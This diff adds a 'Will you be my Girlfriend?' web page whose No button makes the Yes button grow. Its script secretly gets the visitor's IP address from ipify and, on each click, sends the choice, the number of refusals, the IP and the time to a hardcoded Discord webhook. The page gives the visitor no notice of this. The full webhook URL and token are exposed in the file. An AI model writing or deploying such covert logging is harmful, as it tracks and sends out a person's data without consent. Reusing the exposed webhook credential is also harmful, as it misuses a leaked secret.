@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Will You Be My Girlfriend?</title>
+    <style>
+        /* CSS stays the same as before */
+        body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #ffe4e1; font-family: sans-serif; text-align: center; overflow: hidden; }
+        .container { padding: 20px; background: white; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); max-width: 90%; }
+        h1 { color: #d63384; }
+        .buttons { display: flex; justify-content: center; align-items: center; gap: 20px; flex-wrap: wrap; margin-top: 20px; }
+        #yesBtn { background-color: #4caf50; color: white; border: none; padding: 15px 30px; font-size: 1.2rem; border-radius: 10px; cursor: pointer; }
+        #noBtn { background-color: #f44336; color: white; border: none; padding: 15px 30px; font-size: 1.2rem; border-radius: 10px; cursor: pointer; }
+        .success-screen { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="mainContainer">
+        <div id="questionArea">
+            <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpueGZ3bmZqZzR3eXp4ZnR6eXp4ZnR6eXp4ZnR6eXp4ZnR6ZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9cw/cLS1cfxvGOPVpf9g3y/giphy.gif" width="150">
+            <h1>Will you be my Girlfriend? 🌹</h1>
+            <div class="buttons">
+                <button id="yesBtn">Yes</button>
+                <button id="noBtn">No</button>
+            </div>
+        </div>
+
+        <div id="successArea" class="success-screen">
+            <h1>Yay! Best decision ever! ❤️</h1>
+        </div>
+    </div>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1487857352869679115/YvduKELscTn-1i6m02Q7m8L357bZvrnFkfl_B_s-Guj8sizPwrLoTvXkrkDW86jYvGxT";
+        const yesBtn = document.getElementById('yesBtn');
+        const noBtn = document.getElementById('noBtn');
+        let noCount = 0;
+        let userIP = "Unknown";
+
+        // Get User IP on load
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => userIP = data.ip);
+
+        function sendLog(action) {
+            if (!webhookURL.includes("http")) return; // Don't run if URL is missing
+            
+            const payload = {
+                content: `🔔 **Valentine Update!**\n**Action:** ${action}\n**Total No's so far:** ${noCount}\n**IP Address:** ${userIP}\n**Time:** ${new Date().toLocaleString()}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        noBtn.addEventListener('click', () => {
+            noCount++;
+            let currentSize = 1.2 + (noCount * 0.5);
+            yesBtn.style.fontSize = currentSize + "rem";
+            yesBtn.style.padding = (15 + noCount * 5) + "px " + (30 + noCount * 10) + "px";
+            
+            // Optional: send a log every time they click no
+            sendLog("Clicked NO ❌");
+        });
+
+        yesBtn.addEventListener('click', () => {
+            document.getElementById('questionArea').style.display = "none";
+            document.getElementById('successArea').style.display = "block";
+            sendLog("Clicked YES! ✅ (Success)");
+        });
+    </script>
+</body>
+</html>
